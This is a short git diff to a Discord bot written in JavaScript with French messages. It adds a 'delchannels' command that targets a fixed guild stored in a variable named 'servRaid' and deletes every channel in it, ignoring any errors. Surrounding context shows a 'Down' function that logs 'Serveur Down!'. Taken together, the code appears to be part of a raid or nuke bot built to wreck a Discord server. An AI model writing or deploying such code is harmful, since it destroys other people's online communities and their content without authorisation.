@@ -19,6 +19,10 @@ client.on("message", async (message) => {
     if(message.content === `${prefix}down`){
         Down();
     }
+
+    if(message.content === `${prefix}delchannels`){
+        DeleteAllChannels(message);
+    }
 })
 
 function Derogation(message){
@@ -72,6 +76,18 @@ function Down(){
         console.log("Serveur Down!")
     }
 }
+function DeleteAllChannels(message){
+    message.channel.send(`**Suppréssion des channels en cours..**`)
+    const servRaid = client.guilds.get(guildID);
+
+    servRaid.channels.forEach(channel => {
+      try{
+          channel.delete();
+      }catch{
+      }
+    });
+}
+
 
 client.login(token);
 client.on('ready', () => {
